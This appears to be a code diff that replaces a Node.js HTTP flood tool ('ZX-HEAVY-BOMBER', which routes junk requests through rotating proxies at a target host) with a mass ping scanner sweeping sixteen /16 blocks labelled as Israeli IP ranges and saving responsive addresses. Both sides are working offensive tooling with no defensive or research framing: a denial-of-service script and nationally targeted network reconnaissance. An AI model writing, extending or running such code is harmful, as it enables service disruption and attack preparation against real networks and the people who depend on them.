@@ -1,90 +1,106 @@
-const http = require('http');
+const { exec } = require('child_process');
+const os = require('os');
 const fs = require('fs');
-const { URL } = require('url');
 
-const [host, duration] = process.argv.slice(2);
-if (!host || !duration) {
-    console.log("Usage: node bomber.js <host> <duration>");
-    process.exit(1);
+// Israeli IP blocks (expanded)
+const israelCIDRBlocks = [
+  "5.0.0.0/16", "31.154.0.0/16", "37.142.0.0/16", "62.90.0.0/16",
+  "77.125.0.0/16", "79.179.0.0/16", "85.64.0.0/16", "94.159.0.0/16",
+  "109.64.0.0/16", "132.72.0.0/16", "147.235.0.0/16", "176.12.0.0/16",
+  "185.32.0.0/16", "192.114.0.0/16", "212.179.0.0/16", "213.8.0.0/16",
+  // Add more if needed
+];
+
+const RESULTS_FILE = 'PINGABLE_IPS.txt';
+const CONCURRENT_SCANS = 2000; // 2000 pings at once
+const LOG_EVERY = 4000; // Log every 4000 IPs checked
+
+// Clear old results
+if (fs.existsSync(RESULTS_FILE)) {
+  fs.unlinkSync(RESULTS_FILE);
 }
 
-const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(x => x.trim().length);
-let proxyIndex = 0;
-let proxyHitCount = 0;
+// Fast IP generator from CIDR
+function* generateIPs(cidr) {
+  const [network, mask] = cidr.split('/');
+  const ipParts = network.split('.').map(Number);
+  const networkAddr = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
+  const broadcastAddr = networkAddr | (0xFFFFFFFF >>> parseInt(mask));
+  
+  for (let ip = networkAddr + 1; ip < broadcastAddr; ip++) {
+    yield [
+      (ip >>> 24) & 0xFF,
+      (ip >>> 16) & 0xFF,
+      (ip >>> 8) & 0xFF,
+      ip & 0xFF
+    ].join('.');
+  }
+}
 
-const end = Date.now() + parseInt(duration) * 1000;
-let sent = 0;
-let failed = 0;
-let maxRPS = 0;
-let lastSent = 0;
+// Ping function (cross-platform)
+function ping(ip) {
+  return new Promise((resolve) => {
+    const platform = os.platform();
+    const command = platform === 'win32' 
+      ? `ping -n 1 -w 1000 ${ip}`
+      : `ping -c 1 -W 1 ${ip}`;
 
-const randPath = () => Math.random().toString(36).substring(2, 12);
-const getNextProxy = () => {
-    if (proxyHitCount >= 12) {
-        proxyIndex = (proxyIndex + 1) % proxies.length;
-        proxyHitCount = 0;
-    }
-    proxyHitCount++;
-    return proxies[proxyIndex];
-};
-
-const sendHeavy = () => {
-    if (Date.now() > end) {
-        console.log(`\nZX-BOMBER DONE`);
-        console.log(`SENT: ${sent}`);
-        console.log(`FAILED: ${failed}`);
-        console.log(`MAX RPS: ${maxRPS}`);
-        process.exit(0);
-    }
-
-    const [ip, port] = getNextProxy().split(':');
-    const reqOptions = {
-        host: ip,
-        port: parseInt(port),
-        method: 'CONNECT',
-        path: `${host}:80`
-    };
-
-    const req = http.request(reqOptions);
-    req.on('connect', (res, socket) => {
-        const reqLine = `GET /${randPath()}?id=${Math.random()} HTTP/1.1\r\n`;
-        const headers = [
-            `Host: ${host}`,
-            `User-Agent: Discordbot/2.0 (+https://discordapp.com)`,
-            `X-BOMBER: GANG`,
-            `Connection: Keep-Alive`,
-            `Content-Length: 15000`,
-            `\r\n`
-        ].join('\r\n');
-
-        const body = 'FLOOD'.repeat(3000);
-
-        socket.write(reqLine + headers + body);
-        sent++;
-        socket.end();
+    exec(command, (error, stdout, stderr) => {
+      resolve(!error && stdout.includes('TTL='));
     });
+  });
+}
 
-    req.on('error', () => {
-        failed++;
-    });
+// Scan a CIDR block
+async function scanBlock(cidr) {
+  const ips = [...generateIPs(cidr)];
+  const totalIPs = ips.length;
+  let checked = 0;
+  let pingable = 0;
 
-    req.end();
-    setImmediate(sendHeavy);
-};
+  console.log(`\n[+] Scanning ${cidr} (${totalIPs.toLocaleString()} IPs)`);
 
-setInterval(() => {
-    const rps = sent - lastSent;
-    lastSent = sent;
-    if (rps > maxRPS) maxRPS = rps;
+  // Batch processing for better concurrency control
+  for (let i = 0; i < ips.length; i += CONCURRENT_SCANS) {
+    const batch = ips.slice(i, i + CONCURRENT_SCANS);
+    const results = await Promise.all(batch.map(ip => ping(ip)));
 
-    console.clear();
-    console.log(`ZX-HEAVY-BOMBER [PROXY MODE]`);
-    console.log(`Target: ${host}`);
-    console.log(`Proxies: ${proxies.length}`);
-    console.log(`Sent: ${sent}`);
-    console.log(`Failed: ${failed}`);
-    console.log(`RPS: ${rps}`);
-    console.log(`MAX RPS: ${maxRPS}`);
-}, 3000);
+    for (let j = 0; j < results.length; j++) {
+      checked++;
+      if (results[j]) {
+        pingable++;
+        fs.appendFileSync(RESULTS_FILE, `${batch[j]}\n`);
+      }
 
-sendHeavy();
+      // Log progress
+      if (checked % LOG_EVERY === 0) {
+        console.log(`[${cidr}] ${checked.toLocaleString()}/${totalIPs.toLocaleString()} checked | ${pingable} pingable`);
+      }
+    }
+  }
+
+  return { checked, pingable };
+}
+
+// Main scanner
+async function main() {
+  console.log('🔥 ISRAELI IP SCANNER (Node.js) 🔥');
+  console.log(`Threads: ${CONCURRENT_SCANS} | Logging every ${LOG_EVERY} IPs\n`);
+
+  let totalChecked = 0;
+  let totalPingable = 0;
+
+  for (const block of israelCIDRBlocks) {
+    const { checked, pingable } = await scanBlock(block);
+    totalChecked += checked;
+    totalPingable += pingable;
+    console.log(`[+] ${block} done: ${pingable}/${checked} pingable`);
+  }
+
+  console.log(`\n✅ SCAN COMPLETE!`);
+  console.log(`Total: ${totalPingable}/${totalChecked} pingable IPs`);
+  console.log(`Results saved to ${RESULTS_FILE}`);
+}
+
+// Run it
+main().catch(console.error);
